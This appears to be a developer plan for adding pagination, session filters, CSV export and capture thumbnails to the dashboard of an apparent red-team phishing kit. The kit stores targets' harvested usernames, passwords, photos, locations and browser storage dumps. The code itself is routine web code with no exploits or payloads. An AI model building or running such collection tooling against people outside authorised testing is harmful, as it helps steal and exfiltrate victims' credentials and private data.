# Plan 005: Dashboard UX Overhaul — Pagination, Export, Capture Preview

> **Executor instructions**: Follow step by step. Run every verification
> command before moving to the next step.
>
> **Drift check**: `git diff --stat 68a5f01..HEAD -- frontend/src/ backend/src/api/mod.rs backend/src/main.rs`

## Status

- **Priority**: P2
- **Effort**: L
- **Risk**: MED
- **Depends on**: 003 (session replay fix provides the session model)
- **Category**: dx
- **Planned at**: commit `68a5f01`, 2026-06-21

## Why this matters

Four UX gaps:
1. **No session drill-down** — can't view all data for one target. Session filter is missing from Captures, Credentials, Locations, and Storage pages.
2. **No data export** — red teamers manually copy data from the UI. No CSV/JSON download for external tools.
3. **No pagination** on credentials, storage, events, locations, IPs — after ~200 targets, oldest data is invisible.
4. **No capture preview on dashboard** — must navigate to /captures to see recent photos.

## Current state

```typescript
// frontend/src/pages/Captures.tsx — has pagination via page/perPage/sort
// frontend/src/pages/Credentials.tsx — no pagination, fetches all
// frontend/src/pages/StorageDumps.tsx — no pagination, fetches all
// frontend/src/pages/Locations.tsx — no pagination
// frontend/src/pages/IpLogs.tsx — no pagination
// frontend/src/pages/Dashboard.tsx — no capture preview thumbnails
// frontend/src/api/client.ts — api object has captures(page, perPage) but not for other entities

// Backend: api/mod.rs
// list_credentials — LIMIT 200, no pagination support
// list_storage — LIMIT 100, no pagination
// list_locations — LIMIT 200, no pagination
// list_ips — LIMIT 500, no pagination
// list_events — LIMIT 500, no pagination
```

## Commands you will need

| Purpose | Command | Expected |
|---------|---------|----------|
| Build frontend | `npm run build` (in frontend/) | exit 0 |
| Check Rust | `cargo check` | exit 0 |

## Scope

**In scope**:
- `backend/src/api/mod.rs` — add pagination params to `list_credentials`, `list_storage`, `list_locations`
- `frontend/src/api/client.ts` — add paginated API methods for credentials, storage, locations
- `frontend/src/pages/Credentials.tsx` — add pagination controls
- `frontend/src/pages/StorageDumps.tsx` — add pagination controls
- `frontend/src/pages/Locations.tsx` — add pagination controls
- `frontend/src/pages/Dashboard.tsx` — add recent capture thumbnails
- `frontend/src/pages/Captures.tsx` — add session filter dropdown
- All entity pages — add "Export CSV" button
- All entity pages — add session filter dropdown

**Out of scope**:
- IpLogs page (its stats aggregation makes pagination complex)
- Events page (it's session-scoped already)
- Backend schema changes
- Session drill-down detail page

## Git workflow

- Branch: `plan/005-dashboard-ux`
- Commits: `feat(api): add pagination params for credentials/storage/locations`, `feat(dashboard): add capture preview thumbnails`, `feat(dashboard): add session filter to entity pages`, `feat(dashboard): add CSV export`

## Steps

### Step 1: Add pagination backend support

In `backend/src/api/mod.rs`, change `list_credentials` to accept query params:

```rust
#[derive(Deserialize)]
pub struct PaginationQuery {
    #[serde(default = "default_page_p")]
    page: i64,
    #[serde(default = "default_per_page_p")]
    per_page: i64,
    session: Option<String>,
}

fn default_page_p() -> i64 { 1 }
fn default_per_page_p() -> i64 { 50 }
```

Apply to `list_credentials`, `list_storage`, `list_locations`:

```rust
pub async fn list_credentials(
    State(state): State<Arc<AppState>>,
    Query(q): Query<PaginationQuery>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let offset = (q.page - 1).max(0) * q.per_page;
    
    let (total, rows) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.unwrap_or(0);
        let rows: Vec<(String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> = 
            sqlx::query_as("SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?")
            .bind(session).bind(q.per_page).bind(offset)
            .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (total, rows)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials")
            .fetch_one(&state.pool).await.unwrap_or(0);
        let rows: Vec<_> = sqlx::query_as("SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?")
            .bind(q.per_page).bind(offset)
            .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (total, rows)
    };

    let pages = if total > 0 { (total + q.per_page - 1) / q.per_page } else { 0 };
    Ok(Json(serde_json::json!({
        "credentials": rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
            serde_json::json!({"id": id, "session_id": session_id, "template_id": template_id, "username": username, "password": password, "email": email, "phone": phone, "ip_address": ip_address, "created_at": created_at})
        }).collect::<Vec<_>>(),
        "total": total,
        "page": q.page,
        "per_page": q.per_page,
        "pages": pages,
    }))
}
```

Apply the same pattern to `list_storage` and `list_locations`.

Update the frontend API client:
```typescript
export interface PaginatedCredentials {
  credentials: Credential[]
  total: number
  page: number
  per_page: number
  pages: number
}
```

**Verify**: `cargo check` → exit 0

### Step 2: Add CSV export to entity pages

Create a reusable CSV export utility in `frontend/src/utils/export.ts`:

```typescript
export function exportCSV(data: Record<string, any>[], filename: string) {
  if (data.length === 0) return
  const headers = Object.keys(data[0])
  const csv = [
    headers.join(','),
    ...data.map(row => headers.map(h => {
      const val = row[h] ?? ''
      const str = String(val)
      return str.includes(',') || str.includes('"') ? `"${str.replace(/"/g, '""')}"` : str
    }).join(','))
  ].join('\n')
  
  const blob = new Blob([csv], { type: 'text/csv' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url; a.download = filename
  a.click()
  URL.revokeObjectURL(url)
}
```

Add an "Export CSV" button to Credentials, StorageDumps, Locations, IpLogs pages.

**Verify**: `npm run build` → exit 0

### Step 3: Add session filter dropdown to entity pages

On each entity page (Credentials, StorageDumps, Locations), add a session selector that fetches from `/api/sessions` and filters results:

```typescript
const [sessions, setSessions] = useState<{id: string, name: string}[]>([])
const [sessionFilter, setSessionFilter] = useState('')

useEffect(() => {
  api.sessions().then(setSessions).catch(() => {})
}, [])

// Then pass sessionFilter to the API call
// For pages with pagination, add ?session=ID to the query
```

Place the dropdown next to the search input.

**Verify**: `npm run build` → exit 0

### Step 4: Add capture preview to dashboard

In `frontend/src/pages/Dashboard.tsx`, after the Quick Actions section, add:

```typescript
const [recentCaptures, setRecentCaptures] = useState<Capture[]>([])

useEffect(() => {
  api.captures(1, 6).then(d => setRecentCaptures(d.captures)).catch(() => {})
}, [])
```

Add a "Recent Captures" section:
```tsx
<div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
  <h3 className="text-sm font-semibold text-gray-400 mb-4">📷 Recent Captures</h3>
  {recentCaptures.length === 0 ? (
    <p className="text-sm text-gray-600">No captures yet</p>
  ) : (
    <div className="grid grid-cols-3 gap-3">
      {recentCaptures.map(c => (
        <a key={c.id} href={c.url} target="_blank" rel="noreferrer"
           className="block aspect-video bg-gray-800 rounded-lg overflow-hidden hover:ring-2 ring-cyan-500 transition-all">
          <img src={c.url} alt="capture" className="w-full h-full object-cover" />
        </a>
      ))}
    </div>
  )}
</div>
```

**Verify**: `npm run build` → exit 0

## Test plan

- Manual: Open dashboard → see recent capture thumbnails (or empty state)
- Manual: Open Credentials page → see pagination controls at bottom → click page 2 → see next page
- Manual: Select a session from dropdown → only that session's credentials shown
- Manual: Click "Export CSV" → downloads `.csv` file with current data
- Manual: Open Locations page → see pagination + session filter

## Done criteria

- [ ] `cargo check` exits 0
- [ ] `npm run build` exits 0
- [ ] Credentials, Storage, Locations pages have pagination controls (prev/next, page numbers)
- [ ] All entity pages have "Export CSV" button that downloads a CSV file
- [ ] Credentials, Storage, Locations pages have session filter dropdown
- [ ] Dashboard shows recent 6 capture thumbnails (or empty state)
- [ ] Captures page has session filter dropdown
- [ ] `plans/README.md` status row updated

## STOP conditions

- The pagination change breaks the frontend's expected API response shape (the old API returned `Credential[]`, now returns `{credentials: Credential[], total, page, ...}`)
- CSV export has encoding issues with special characters in credentials

## Maintenance notes

- The new paginated API returns `{credentials: [...], total, page, per_page, pages}` — all frontend consumers must be updated to unwrap `.credentials`.
- CSV export uses a simple implementation — for large datasets (>10K rows), consider server-side export.
- Session filter on entity pages only filters that entity type — for a full target dossier, the Plan 005 session drill-down is needed.
